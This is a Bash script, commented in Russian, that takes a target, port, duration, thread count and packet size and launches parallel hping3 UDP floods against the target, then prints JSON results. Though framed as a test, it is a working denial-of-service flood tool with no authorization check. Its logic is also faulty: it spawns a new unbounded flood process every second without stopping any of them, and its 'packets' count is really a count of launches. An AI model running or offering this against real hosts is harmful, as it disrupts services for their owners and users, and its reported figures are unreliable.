#!/bin/bash

# Проверяем наличие необходимых утилит
command -v hping3 >/dev/null 2>&1 || { echo "{\"error\": \"hping3 не установлен\", \"details\": \"Установите его командой: apt-get install hping3\"}"; exit 1; }

# Получаем параметры
TARGET=$1
PORT=$2
DURATION=$3
THREADS=$4
PACKET_SIZE=$5

# Проверяем параметры
if [ -z "$TARGET" ] || [ -z "$PORT" ] || [ -z "$DURATION" ] || [ -z "$THREADS" ] || [ -z "$PACKET_SIZE" ]; then
    echo "{\"error\": \"Не все параметры указаны\"}"
    exit 1
fi

# Проверяем корректность параметров
if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
    echo "{\"error\": \"Некорректный порт\"}"
    exit 1
fi

if ! [[ "$DURATION" =~ ^[0-9]+$ ]] || [ "$DURATION" -lt 1 ]; then
    echo "{\"error\": \"Некорректная длительность\"}"
    exit 1
fi

if ! [[ "$THREADS" =~ ^[0-9]+$ ]] || [ "$THREADS" -lt 1 ]; then
    echo "{\"error\": \"Некорректное количество потоков\"}"
    exit 1
fi

if ! [[ "$PACKET_SIZE" =~ ^[0-9]+$ ]] || [ "$PACKET_SIZE" -lt 1 ] || [ "$PACKET_SIZE" -gt 65507 ]; then
    echo "{\"error\": \"Некорректный размер пакета\"}"
    exit 1
fi

# Функция для отправки UDP-пакетов
send_udp_packets() {
    local target=$1
    local port=$2
    local duration=$3
    local packet_size=$4
    local thread_id=$5
    local start_time=$(date +%s)
    local packets=0
    
    while [ $(($(date +%s) - start_time)) -lt $duration ]; do
        hping3 -2 -d $packet_size -p $port --flood $target > /dev/null 2>&1 &
        sleep 1
        packets=$((packets + 1))
    done
    
    echo "{\"thread_id\": $thread_id, \"packets\": $packets, \"duration\": $duration}"
}

# Создаем временный файл для результатов
TEMP_FILE=$(mktemp)

# Запускаем тест в указанном количестве потоков
for ((i=0; i<THREADS; i++)); do
    send_udp_packets "$TARGET" "$PORT" "$DURATION" "$PACKET_SIZE" "$i" >> "$TEMP_FILE" &
    pids[$i]=$!
done

# Ждем завершения всех потоков
for pid in "${pids[@]}"; do
    wait $pid
done

# Собираем результаты в JSON массив
echo "{\"test_info\": {\"target\": \"$TARGET\", \"port\": $PORT, \"duration\": $DURATION, \"threads\": $THREADS, \"packet_size\": $PACKET_SIZE}, \"results\": ["
first=true
while IFS= read -r line; do
    if [ "$first" = true ]; then
        first=false
    else
        echo ","
    fi
    echo "$line"
done < "$TEMP_FILE"
echo "]}"

# Удаляем временный файл
rm -f "$TEMP_FILE" 